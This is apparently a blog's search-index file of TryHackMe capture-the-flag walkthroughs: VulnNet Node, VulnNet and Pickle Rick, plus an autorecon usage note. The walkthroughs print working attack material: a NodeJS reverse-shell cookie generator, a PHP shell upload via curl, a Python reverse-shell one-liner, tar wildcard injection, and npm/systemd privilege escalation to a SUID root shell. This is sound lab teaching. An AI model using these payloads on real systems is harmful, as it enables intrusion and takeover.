[ { "title": "Try Hack Me - VulnNet dotpy Walkthrough", "url": "/posts/THM_VulnNet_dotpy/", "categories": "", "tags": "THM, VulnNet, ctf, medium, linux, flask, jinja2", "date": "2022-07-29 08:00:00 -0400", "snippet": "Next in the VulnNet series, is VulnNet dotpy. If I had to guess this is a python-flask box." }, { "title": "Try Hack Me - VulnNet Node Walkthrough", "url": "/posts/THM_VulnNet_Node_walkthrough/", "categories": "", "tags": "THM, VulnNet, ctf, easy, linux, express, services", "date": "2022-07-27 08:00:00 -0400", "snippet": "Continuing on with the VulnNet series, this box is called VulnNet Node.Click on the image below for my video walkthough of the box:We start the box by running autorecon. Click here to see my post on how to use itReconLooking at our NMAP scans there appears to only be one port open 8080PORT STATE SERVICE REASON VERSION8080/tcp open http syn-ack ttl 61 Node.js Express framework|_http-title: VulnNet &amp;ndash; Your reliable news source &amp;ndash; Try Now!NMAP does tell us that this site is running the Node.js Express framwork.We take a look at the site:And we find a login page. We could try to brute force, but let’s keep looking before we take a sledge hammer to the website.Using inspect on the page we see that there is a session cookie that is base64 encoded.Fun Fact: the %3Ds at the end of the string are just HTML encoded = signs that you would expect at the end of some base64 strings.We see that the base64 is just some serialized json. Let’s use the Burp Suite Decoder tab to help us change the values to username:Admin and isGuest:falseAfter adding the new cookie and refreshing the page we get an error:This is good news because the Express Framework has a vulnerability involving serialized json.Exploit serialized json for footholLet’s google it!!Checking out that first website we discover that we can create an evil cookie that will trigger remote code execution.I found a modified version of the script from this site that works nicely for our purposes:#!/usr/bin/python# Generator for encoded NodeJS reverse shells# Based on the NodeJS reverse shell by Evilpacket# https://github.com/evilpacket/node-shells/blob/master/node_revshell.js# Onelineified and suchlike by infodox (and felicity, who sat on the keyboard)# Insecurety Research (2013) - insecurety.netimport sysimport base64#if len(sys.argv) != 3:# print \"Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;\" % (sys.argv[0])# sys.exit(0)IP_ADDR = sys.argv[1]PORT = sys.argv[2]def charencode(string): \"\"\"String.CharCode\"\"\" encoded = '' for char in string: encoded = encoded + \",\" + str(ord(char)) return encoded[1:]print(\"[+] LHOST = \" + IP_ADDR)print(\"[+] LPORT = \" + PORT)NODEJS_REV_SHELL = '''var net = require('net');var spawn = require('child_process').spawn;HOST=\"%s\";PORT=\"%s\";TIMEOUT=\"5000\";if (typeof String.prototype.contains === 'undefined') { String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }function c(HOST,PORT) { var client = new net.Socket(); client.connect(PORT, HOST, function() { var sh = spawn('/bin/sh',[]); client.write(\"Connected!\\\\n\"); client.pipe(sh.stdin); sh.stdout.pipe(client); sh.stderr.pipe(client); sh.on('exit',function(code,signal){ client.end(\"Disconnected!\\\\n\"); }); }); client.on('error', function(e) { setTimeout(c(HOST,PORT), TIMEOUT); });}c(HOST,PORT);''' % (IP_ADDR, PORT)print(\"[+] Encoding\")print(\"njs payload: \" + NODEJS_REV_SHELL)PAYLOAD = charencode(NODEJS_REV_SHELL)PAYLOAD = \"eval(String.fromCharCode(\" + PAYLOAD + \"))\"print(PAYLOAD)PAYLOAD = '{\"rce\":\"_$$ND_FUNC$$_function (){' + PAYLOAD + '}()\"}'print(PAYLOAD)PAYLOAD = base64.b64encode(PAYLOAD.encode('ascii'))print(PAYLOAD)You run the above script like this: python3 nodeshell.py &lt;RHOST&gt; &lt;RPORT&gt;The output will have a base64 string, copy it and use it as the value for the session cookie.DON’T forget to start your listener!!!AND SPECIAL NOTE! On this box we will need to use nano and I was not able to get a stable shell using rlwrap with nc I had to use nc -nvlp 1337 by itself and then use some stablization.Refresh the page with the modified cookie:Pivot from www to serv-manageWe drop in as the www user. Time to look around and see what we find.Looking in the /home directory we find 2 users:lltotal 16drwxr-xr-x 4 root root 4096 Jan 24 2021 ./drwxr-xr-x 23 root root 4096 Jan 24 2021 ../drwxr-x--- 17 serv-manage serv-manage 4096 Jan 24 2021 serv-manage/drwxr-xr-x 7 www www 4096 Jan 24 2021 www/www@vulnnet-node:/home$I copy LSE over to the machine with wgetWhen I run it (./lse.sh -l1) I immediately notice this:So we go to gtfobins and lookup npmWe will have to modify the commands slightly from the info on the site:We need to make sure to sudo -u serv-manage because sudo privleges are to run npm as serv-manage NOT as root.Also we use the full path to npm to be safe /usr/bin/npmAnd lastly chmod 777 -R $TF - this give full permissions to our temp file and is recursive.TF=$(mktemp -d)echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' &gt; $TF/package.jsonchmod 777 -R $TFsudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm iIt also works as a one-liner!!TF=$(mktemp -d); echo '{\"scripts\": {\"preinstall\": \"/bin/sh\"}}' &gt; $TF/package.json; chmod 777 -R $TF; sudo -u serv-manage /usr/bin/npm -C $TF --unsafe-perm iYou should see somthing like this:Escalate to rootWe jump straight to sudo -lAnd we discover that again we have some sudo permissions but this time we can run some commands as root!Let’s use locate to find the vulnnet service we have access to and examine it.locate vulnnet-auto.timer.timerls -lah /etc/systemd/system/vulnnet-auto.timercat /etc/systemd/system/vulnnet-auto.timerThis service appears to refer to another service vulnnet-job.service let’s take a look at it too.locate vulnnet-auto.timer.timerls -lah /etc/systemd/system/vulnnet-job.servicecat /etc/systemd/system/vulnnet-job.serviceWe need to modify both files.I used nano, but failed several times before I was able to do it because my shell was unstable.First we change the interval on the vulnnet-auto.timer to every minute:[Unit]Description=Run VulnNet utilities every 30 min[Timer]OnBootSec=0min# 30 min jobOnCalendar=*:0/1Unit=vulnnet-job.service[Install]WantedBy=basic.targetThen we change the vulnnet-job.service:[Unit]Description=Logs system statistics to the systemd journalWants=vulnnet-auto.timer[Service]# Gather system statisticsType=forkingExecStart=/bin/bash -c 'cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash'[Install]WantedBy=multi-user.targetWe don’t need a shell. In fact, creating a rootbash will work better.After modifing the files we need to navigate to /tmp and wait for the creation of our rootbashThanks for reading!" }, { "title": "Try Hack Me - VulnNet Walkthrough", "url": "/posts/THM_VulnNet_walkthrough/", "categories": "", "tags": "THM, VulnNet, ctf, medium, linux, subdomains, LFI, ssh2john, burp", "date": "2022-07-26 08:00:00 -0400", "snippet": "IntroThis is the oldest of the VulnNet boxes on Try Hack Me. It is also rated as a medium difficulty box.ReconFirst we will scan the host. I will use autorecon by Tib3rius to get things started.If you have never used it before and would like some explaination, check out this post: Using AutoReconVulnNet Home Page:Setup /etc/hosts file Looking through the nmap scans we find a domain name: vulnnet.thmThis means we should update our /etc/hosts file on our local attack machine with a line that looks like:&lt;xx.xx.xx.xx&gt; vulnnet.thm Replace the xx.xx.xx.xx wit hthe ip the vulnnet machine is assigned. If we look at the dirbuster/feroxbuster results we find 2 .js files.Let’s examine these files for more clues.Possible LFI PointIn one file we find a reference to: http://vulnnet.thm/index.php?referer=If we try http://vulnnet.thm/index.php?referer=/etc/passwd the page just looks like normal, but if we view source on the page that is returned:Looks like we have two ‘real’ users:root:x:0:0:root:/root:/bin/bashserver-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bashNew SubdomainIn the other .js file we find a reference to a subdomain: broadcast.vulnnet.thmWe should go back and add that to our line in /etc/hosts for VulnNet:&lt;xx.xx.xx.xx&gt; vulnnet.thm broadcast.vulnet.thm Replace the xx.xx.xx.xx wit hthe ip the vulnnet machine is assigned.When we go to the site we see that it directs us to log in.Using burp we verify it is “basic auth”Ok so now let’s go back to our LFI - (Local File Inclusion) and check for /etc/apache2/sites-enabled/000-default.confNow lets see if we can view the .htpasswd file.We were able to retrieve a user hash. Let’s crack it with johnSo here is the command I used:john --pot=cracked.pot --wordlist=/usr/share/wordlists/rockyou.txt hash I use the --pot=&lt;filename&gt;.pot so that john save any cracked passwords in that file, so I don’t forget to save them myself! The --wordlist is the location ofthe wordlist you wish to use. Your rockyou.txt might live in a different place than mine. And hash is just the name of the file I saved the hash we found in.ClipBucket?And now we login to Clip Bucket….what ever that is.Let’s see if we can find out what version it is.Let’s view the page source:And there it is: ClipBucket version 4.0Exploiting ClipBucketLet’s check searchsploit: searchsploit clipbucketWe can copy the exploit to our current location useing the -m (mirror) flag.searchsploit -m php/webapps/44250.txtReading through the exploit 44250.txt, it seems to imply that there is a /actions directory on the ClipBucket app.Let’s check it out….So it looks like if we use this command:sudo curl -F \"file=@thm-shell.php\" -F \"plupload=1\" -F \"name=shell.php\" \"http://broadcast.vulnnet.thm/actions/beats_uploader.php\" -u developers:&lt;PASSWORD&gt;We should be able to upload a reverse shell.DON’T foget to set up your listener! :)After the file is uploaded check the actions directory and there is a new folder: CB_BEATS_UPLOAD_DIR the rev shell file will be in there.Footholdwww-data userFirst upgrade shell: python3 -c \"import pty;pty.spawn('/bin/bash')\"First run this to make sure your path and some others things are setup correctly in your shell:export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp;export TERM=xterm-256color;alias ll='ls -lah --color=auto'And I created a little one liner to get some quick info on the system.echo '----------';which gcc;which cc;which python;which python3;which perl;echo '';which wget;which curl;which nc;echo '';whoami;id;echo '';file /bin/bash;echo '';uname -a;cat /etc/issue;cat /etc/*-release;echo '-----------'Which gets you this:Next I will use wget to copy the lse.sh script over to look for privesc options.Here is the github repo for LSEWe discover this file running LSE:[!] fst190 Can we read any backup?......................................... yes!----rw-rw-r-- 1 server-management server-management 1484 Jan 24 2021 /var/backups/ssh-backup.tar.gzI wasn’t able to extract the tar file on the machine, so since we have python3 I fired up a python3 http server with: python3 -m http.server 8000 to copy the file over.Extracting the backup file gives us an id_rsa file. But it is password protected.Use ssh2john id_rsa &gt; id_rsa.hashand then use the john to crack the newly created hash.DON’T forget to chmod 400 id_rsaNow we can login through ssh with the server-management user.server-management userFrom this account running LSE reveals a cron running a file we have write access to.The script the cron runs is in /var/opt/backupsrv.sh Examining that file reveals that is making a backup out of all the files in /home/server-management/Documents using the “*” wildcard.You can read about we can use this at gtfobins BTW that site should be on your speed dial!There is also a great article about exploiting the wildcard HEREOn your local machine: msfvenom -p cmd/unix/reverse_netcat lhost=&lt;local-ip&gt; lport=&lt;desired-port&gt; R to get your reverse shell.Start your listener!On the target machine navigate to /home/server-management/Documentsecho \"YOUR REVERSE SHELL FROM MSFVENOM HERE\" &gt; shell.shchmod +x shell.shecho \"\" &gt; \"--checkpoint-action=exec=sh shell.sh\"echo \"\" &gt; --checkpoint=1And then wait for the cron to run. Your shell should pop up.Go get that root flag!" }, { "title": "Using autorecon", "url": "/posts/using_autorecon/", "categories": "", "tags": "recon", "date": "2022-07-26 06:00:00 -0400", "snippet": "My favorite tool for inital recon of boxes is: autorecon by Tib3riusI create a new folder for the box and then a command that looks like:sudo python3 /tool_repos/AutoRecon/autorecon.py &lt;xx.xx.xx.xx&gt; --dirbuster.threads=100 -o /path/to/box_folder &amp;&amp; sudo chown -R &lt;user&gt;:&lt;user&gt; /path/to/box_folderOk let me explain that command: sudo python3 - I use sudo because some of the tools autorecon uses need to be run as root. The problem with this is any files created are owned by root. (We will fix this in a second.) /tool_repos/AutoRecon/autorecon.py - I always create a directory on my kali boxes to store all the tools I git clone from github. (Even better if you have NFS storage your home lab, use that to mount the folder with all the tools you like. Then whenever you need to rebuild your kali box you mount the folder and all your tools are ready to go.) &lt;xx.xx.xx.xx&gt; - This is just a placeholder for the IP of the box you are scanning. --dirbuster.threads=100 - How many dirbuster threads you want to allocate. This is an important setting. A higher number of threads helps the scan get done faster. -o /path/to/box_folder - This is the output path for the results of the scans. &amp;&amp; sudo chown -R &lt;user&gt;:&lt;user&gt; /path/to/box_folder - This is some magic I add to the end of the scan. The &amp;&amp; just means run the next command if the previous command was successful Because we used sudo all the files created are owned by root. So we use sudo here to change ownership back to us. We use a recursive chown to set the owenership of the files back to our ‘regular’ user. Just replace both &lt;user&gt; spots with the name of your user. " }, { "title": "Try Hack Me - Pickle Rick Walkthrough", "url": "/posts/THM_pickle_rick_walkthrough/", "categories": "", "tags": "THM, ctf, beginner", "date": "2022-07-24 08:00:00 -0400", "snippet": "Link to Pickle Rick Try Hack Me RoomClick on the image below to go to Part 1 of my video walkthough of the box:Oldie but a a Goodie!This is an old room on Try Hack Me. At the time I am writing this walkthrough it has been released for almost 4 years!This room is also a CTF (Capture the Flag) room which means that it is not a “Real World” experience. Instead it is meant to help us practice our skills.Scanning the HostFirst we will scan the host. I like to use autorecon by Tib3rius to get things started.I create a new folder for the room and then a command that looks like:sudo python3 /tool_repos/AutoRecon/autorecon.py &lt;xx.xx.xx.xx&gt; --dirbuster.threads=100 -o /path/to/box_folder &amp;&amp; sudo chown -R &lt;user&gt;:&lt;user&gt; /path/to/box_folderOk let me explain that command: sudo python3 - I use sudo because some of the tools autorecon uses need to be run as root. The problem with this is any files created are owned by root. (We will fix this in a second.) /tool_repos/AutoRecon/autorecon.py - I always create a directory on my kali boxes to store all the tools I git clone from github. (Even better if you have NFS storage your home lab, use that to mount the folder with all the tools you like. Then whenever you need to rebuild your kali box you mount the folder and all your tools are ready to go.) &lt;xx.xx.xx.xx&gt; - This is just a placeholder for the IP of the box you are scanning. --dirbuster.threads=100 - How many dirbuster threads you want to allocate. This is an important setting. A higher number of threads helps the scan get done faster. -o /path/to/box_folder - This is the output path for the results of the scans. &amp;&amp; sudo chown -R &lt;user&gt;:&lt;user&gt; /path/to/box_folder - This is some magic I add to the end of the scan. The &amp;&amp; just means run the next command if the previous command was successful Because we used sudo all the files created are owned by root. So we use sudo here to change ownership back to us. We use a recursive chown to set the owenership of the files back to our ‘regular’ user. Just replace both &lt;user&gt; spots with the name of your user. Scan ResultsAfter running autorecon we see that there are only 2 ports open: tcp 22 (SSH) tcp 80 (HTTP)Lets’s take a look at port 80.It’s important to remember that autorecon with run a ton of NMAP scripts against the ports it finds before we jump into a web browser and look at the page let’s examine what it found.PORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))|_http-chrono: Request times for /; avg: 578.44ms; min: 566.60ms; max: 605.38ms| http-enum:| /login.php: Possible admin folder|_ /robots.txt: Robots fileFirst we see that there is a robots.txt file these can contain some good information. Let’s check it out. You can learn more about robots.txt files HERE The only thing we find is: Wubbalubbadubdub NMAP is also telling us it found login.php, we will have to remember to come back to that.NOTE: I have learned with CTFs to always note strange discoveries like this, they are usually not there by accident.Here is the next interesting finding in from the NMAP scan:| http-comments-displayer:| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.210.147|| Path: http://10.10.210.147:80/| Line number: 28| Comment:| &lt;!--|| Note to self, remember username!|| Username: R1ckRul3s|| --&gt;We should always check to HTML comments in the page source, but NMAP will do it for us! (To my shame, it took me a while to realize that autorecon was running this NMAP script against HTTP ports.)So now we have a username too: R1ckRul3sLogin PageTime to check out the discovered login page.We have a username and what could be a password, let’s try it!It worked! Now I really want to play with that Command Panel, but let’s take some time to look at the tabs on the page.All the tabs say that only the “REAL” Rick can view the pages. This may mean that are only logged in as a low level user and need a different login to view the other pages.Ok time to play with Command Panel, and it looks like we have direct code execution on the box.But not for everything, when we try: cat /etc/passwd we get:If we run pwd we see that we are in /var/www/html and if we run ls -lah we see some files we did know about, index.html and login.php and some we didn’t. Let see if we can navigate directly to these new files.And we find the answer for “the first ingredient” in the file: Sup3rS3cretPickl3Ingred.txtclue.txt tells us that we need to look around the filesystem some more.We always want to know what users are on a system so let’s ls -lah /homeWe see 2 users, ubuntu and rick and rick’s permissions are wide open so let’s explore his home directory.But after I looked around for a while longer I didn’t find much. I think it’s time to pop a shell on this box.First let’s see if we can use python3:Now that we know that python3 executes we can try to pop a shell!Let’s try this one. DON’T FORGET TO CHAGNE YOUR HOST IP AND PORT in the command! :)By the way, I tried few different reverse shells. The one below may not always work, but it did here. Many times you will have to experiment to discover with will work on a given box.export RHOST=\"xx.xx.xx.xx\";export RPORT=xxxx;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'And once we get our shell, let’s ‘upgrade’ it:python3 -c \"import pty;pty.spawn('/bin/bash')\"Now we can go get the answer to the 2nd question!So now we have a “foothold” on the box, it’s time to do some privesc (priviledge escalation)I like to use LSE (Linux Smart Enumeration) tool when enumerating a system for possible privesc points.BUT, before we do all that we should just check to see if our user has sudo privleges. Which in the real world the www-data user should never have! So we try sudo -l which should tell us what privleges the user has.Wow, we can run ALL commands as root with no password!!Looks like Rick likes to live dangerously!You can either use sudo in front of all your commands or just switch to root with sudo suNow you can get the answer to the third question in the /root directory!" }, { "title": "Hello World", "url": "/posts/hello_world/", "categories": "", "tags": "python", "date": "2022-06-19 08:00:00 -0400", "snippet": "Hello World!print(\"hello world!\")" } ]
